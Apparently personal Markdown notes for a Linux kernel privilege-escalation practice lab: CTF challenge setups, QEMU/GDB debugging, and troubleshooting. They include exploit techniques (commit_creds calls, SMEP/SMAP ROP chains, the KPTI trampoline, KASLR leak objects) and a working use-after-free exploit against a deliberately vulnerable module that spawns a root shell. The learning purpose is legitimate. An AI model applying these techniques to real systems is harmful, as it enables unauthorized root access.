# kernelCTF / Linux Kernel LPE Practice Environment Setup and Techniques

## Environment Location
- **Working directory**: `~/kernelctf/`
- **Documentation**: `~/kernelctf/README.md` (full structure + usage)

---

## Prepared Challenge Environments

### 1. fasterbox (Google CTF 2024)
- **Kernel**: Linux 6.10.0-rc1
- **Type**: seccomp sandbox escape
- **Location**: `~/tools/google-ctf/2024/quals/pwn-fasterbox/challenge/`
- **Boot**: `bash ~/kernelctf/scripts/debug_boot.sh`
- **Core vulnerability**: seccomp filter allows all `syscall number > 400` (except 3 io_uring)
- **Protections**: KASLR ON, KPTI OFF, SLAB hardening OFF, SELinux ON, KALLSYMS_ALL ON
- **Attack direction**: Abuse syscall >= 401 new syscalls or check futex2/landlock family

### 2. gatekey (Google CTF 2020, Jann Horn)
- **Kernel**: Custom patch (adds `gatekey` PKU protection mechanism)
- **Type**: PKU (Protection Keys for Userspace) bypass
- **Location**: `~/tools/google-ctf/2020/quals/pwn-gatekey/`
- **Boot**: `bash ~/tools/google-ctf/2020/quals/pwn-gatekey/launch_qemu.sh`
- **Goal**: Access flagdb protected by PKU

### 3. LPE Practice Environment (custom UAF module) — 6.17.0
- **Kernel**: Linux 6.17.0-14-generic (built using system kernel headers)
- **bzImage**: `~/kernelctf/kernels/bzImage-6.17.0` (extracted from vmlinuz)
- **vmlinux**: `~/kernelctf/kernels/vmlinux-6.17.0` (62MB, GDB symbols)
- **Vulnerable module**: `/dev/vulnmod` — Use-After-Free (UAF)
- **Protections**: KASLR + KPTI + SMEP + SMAP (qemu64,+smep,+smap)
- **Boot**: `bash /tmp/start_qemu.sh` (telnet serial → connect via socat/python)
- **Access**: `python3 -c "import socket..."` or `socat - TCP:127.0.0.1:4444`
- **GDB**: `gdb ~/kernelctf/kernels/vmlinux-6.17.0 -ex 'target remote :1234'` (when adding -s -S to QEMU)

---

## kernelCTF Official Program

- **Target**: Linux kernel LTS (6.1, 6.6), COS (Container-Optimized OS)
- **Goal**: LPE exploit → read `/dev/sda` → obtain flag
- **Reward**: $21K (1-day) ~ $91K (0-day + novel technique)
- **Submission**: GitHub PR (exploit code made public)
- **Environment**: QEMU, KVM available

---

## Linux Kernel LPE Step-by-Step Techniques

### Phase 1: Basics (no protections)
**Kernel boot options**: `nokaslr nopti nosmap nosmep`

```c
// Direct call to commit_creds(&init_cred)
void escalate() {
    void (*commit_creds)(void*) = (void*)COMMIT_CREDS_ADDR;
    void *init_cred = (void*)INIT_CRED_ADDR;
    commit_creds(init_cred);
}
// Read address from /proc/kallsyms (when KASLR OFF)
// $ grep -E "commit_creds|init_cred" /proc/kallsyms
```

### Phase 2: SMEP/SMAP Bypass
**Kernel boot options**: `nokaslr nopti`

- Cannot execute userspace code directly (SMEP)
- Cannot access userspace data directly (SMAP)
- **Technique**: Construct kernel ROP chain
  ```
  gadget1: mov rdi, rsp; ret         → rdi = stack ptr
  gadget2: pop rsi; ret              → rsi = init_cred
  gadget3: call commit_creds; ret
  gadget4: swapgs; ret
  gadget5: iretq
  ```
- ROP gadget search: `ROPgadget --binary vmlinux --rop`

### Phase 3: KASLR Bypass
**Information leak techniques**:
1. `/proc/kallsyms` (requires root) or direct leak via vulnerability
2. `seq_operations` struct leak (kmalloc-32 slab)
3. Heap leak via `msg_msg` struct
4. `pipe_buffer` struct (pipe_inode_info pointer)
5. `tty_struct` (ops pointer → calculate kernel base)

```c
// Example KASLR base calculation
int seq_fd = open("/proc/self/stat", O_RDONLY);  // kmalloc-32 allocation
// leak seq_operations->start pointer
uint64_t kernel_base = leak - SINGLE_START_OFFSET;
```

### Phase 4: Full Real-World (KASLR + KPTI + SMEP + SMAP)

**Key kernel object usage**:

| Object | Slab Size | Usage |
|---------|---------|------|
| `pipe_buffer` | kmalloc-1024 | ops pointer → kernel address leak |
| `msg_msg` | kmalloc-64 ~ 4096 | adjacent object OOB read/write |
| `timerfd_ctx` | kmalloc-256 | reallocation after UAF |
| `tty_struct` | kmalloc-1024 | overwrite ops pointer |
| `sk_buff` | variable | heap spray |
| `user_key_payload` | variable | arbitrary size kmalloc |

**KPTI bypass (signal handler)**:
```c
// Safe return using kpti trampoline
// Use swapgs_restore_regs_and_return_to_usermode gadget
rop[i++] = kbase + KPTI_TRAMPOLINE;
rop[i++] = 0;  // padding
rop[i++] = 0;  // padding
rop[i++] = (uint64_t)shellcode;
rop[i++] = user_cs;
rop[i++] = user_rflags;
rop[i++] = user_sp;
rop[i++] = user_ss;
```

---

## UAF → cred Overwrite Basic Pattern

```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define VULNMOD_ALLOC  0x1337
#define VULNMOD_FREE   0x1338
#define VULNMOD_WRITE  0x1339

struct op { size_t size; char *data; };

int main() {
    int fd = open("/dev/vulnmod", O_RDWR);

    // 1. Allocate cred-size (192) slab
    struct op o = {.size=192};
    ioctl(fd, VULNMOD_ALLOC, &o);

    // 2. free → pointer not NULLed
    ioctl(fd, VULNMOD_FREE, 0);

    // 3. fork → expect child's cred struct to reuse same slab address
    if (fork() == 0) {
        // child: cred allocated

        // 4. UAF write: overwrite uid/gid with 0
        char zero_cred[192] = {0};
        struct op w = {.size=8, .data=zero_cred};  // maintain usage count
        ioctl(fd, VULNMOD_WRITE, &w);

        // 5. Check privileges
        if (getuid() == 0) {
            execl("/bin/sh", "sh", NULL);
        }
    }
    wait(NULL);
    return 0;
}
```

---

## QEMU Kernel Debugging GDB Commands

```bash
# Load kernel symbols
(gdb) file ~/kernelctf/kernels/vmlinux-6.1.119-ctf
(gdb) target remote :1234

# Check kernel base (KASLR)
(gdb) p &_text

# Track slab allocations
(gdb) b kmem_cache_alloc
(gdb) b kfree

# Check cred struct
(gdb) p *(struct cred*)$rdi

# Current task
(gdb) p current->cred->uid

# Search kallsyms symbol
(gdb) info address commit_creds
(gdb) info address init_cred
```

---

## Environment Setup Troubleshooting (2026-02-27)

### Kernel Build Issues
- Downloading 6.1.119 from kernel.org at 10-60KB/s → ~60 minutes → **gave up**
- **Solution**: Use system kernel 6.17.0 headers (`linux-headers-6.17.0-14-generic`)
- Build vulnmod.ko: `make -C /lib/modules/$(uname -r)/build M=$PWD modules`

### vmlinuz Extraction
- `/boot/vmlinuz-*` is root-only → `sudo bash -c "cp ..."` single command
- Extract bzImage: `extract-vmlinux vmlinuz > vmlinux` (extract-vmlinux from binutils or scripts/extract-vmlinux)

### busybox setpriv Compatibility (Important!)
- BusyBox v1.36.1's `setpriv` does not support `--reuid=VALUE`
- Supported flags: `-d,--dump --nnp,--no-new-privs --inh-caps CAP --ambient-caps CAP`
- `setuidgid` applet also not included
- **Solution**: Use statically compiled `droppriv` binary
  ```c
  // /tmp/droppriv.c
  #include <unistd.h>
  #include <sys/types.h>
  #include <grp.h>
  int main(void) {
      setgroups(0, NULL); setgid(1000); setuid(1000);
      char *argv[] = {"/bin/sh", NULL};
      execv("/bin/sh", argv);
      return 1;
  }
  // gcc -static -o droppriv droppriv.c
  ```
- In init: `exec setsid /bin/sh -c 'exec /bin/droppriv </dev/ttyS0 >/dev/ttyS0 2>&1'`

### QEMU Port Conflict
- When using `-serial telnet:127.0.0.1:4444,server,nowait`, a previous QEMU zombie occupies the port
- **Solution**: `sudo fuser -k 4444/tcp` then restart
- Check for zombies: `ss -tlnp | grep 4444`, `pgrep -la qemu`

### QEMU KVM Access
- Need to re-login after adding to kvm group (sg kvm workaround available)
- Nested virt required inside Proxmox VM (SVM flag)
- **TCG mode**: Works without KVM (slow but functional) — `-cpu qemu64,+smep,+smap`

### rootfs Build Script
```bash
cd ~/kernelctf/rootfs && find . | cpio -H newc -o 2>/dev/null | gzip -9 > ~/kernelctf/rootfs.cpio.gz
```

## Reference Resources

- `~/tools/linux-kernel-exploitation/README.md` — collection of technique links
- kernelCTF public writeups: `~/tools/google-ctf-writeups/`
- how2heap (heap techniques): `~/tools/how2heap/`
- PAWNYABLE kernel tutorial: https://pawnyable.cafe/linux-kernel/
- lkmidas tutorial: https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/
